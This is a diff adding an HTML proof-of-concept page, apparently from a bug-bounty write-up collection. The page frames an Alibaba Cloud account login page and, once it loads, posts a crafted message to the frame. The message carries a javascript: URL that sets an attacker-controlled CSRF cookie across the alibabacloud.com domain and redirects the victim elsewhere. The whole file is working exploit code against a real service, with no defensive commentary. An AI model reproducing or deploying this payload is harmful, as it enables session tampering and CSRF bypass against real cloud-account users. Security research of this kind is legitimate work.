@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Iframe PostMessage Example</title>
+</head>
+<body>
+
+<iframe
+  id="myIframe"
+  src="https://account-cn.alibabacloud.com?mini_login_embedder=true"
+  width="800"
+  height="500"
+  style="border:1px solid #ccc">
+</iframe>
+
+<script>
+  const iframe = document.getElementById("myIframe");
+
+  const message2 = {
+    action: "redirectIframeParent",
+    payload: {
+      url: "javascript:document.cookie = 'login_aliyunid_csrf=attacker; domain=.alibabacloud.com; path=/account_appeal_intl/;', window.location.href = 'https://yunxohang.github.io/writeups/simplexss.html';"
+    }
+  };
+
+  const encodedData2 = encodeURIComponent(JSON.stringify(message2));
+
+  // Send message immediately after iframe loads
+  iframe.addEventListener("load", () => {
+    iframe.contentWindow.postMessage(encodedData2, "*");
+  });
+</script>
+
+</body>
+</html>
